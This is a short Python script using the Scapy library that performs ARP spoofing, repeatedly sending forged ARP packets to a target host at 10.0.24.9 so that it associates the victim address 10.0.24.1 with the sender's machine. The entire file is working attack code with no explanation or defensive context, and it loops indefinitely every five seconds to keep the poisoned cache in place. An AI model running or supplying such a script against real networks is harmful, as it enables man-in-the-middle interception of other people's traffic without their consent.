#!/usr/bin/env python
from scapy.all import *

# Set variables
target = "10.0.24.9"
victim = "10.0.24.1"
interval = 5

# Generate ARP Spoofing Packet
tMAC = getmacbyip(target)
packet = Ether(dst=tMAC)/ARP(op=1, psrc = victim, pdst = target)
packet.show()

# Perform ARP Spoofing
while 1:
    sendp(packet, iface_hint = target)
    time.sleep(int(interval))
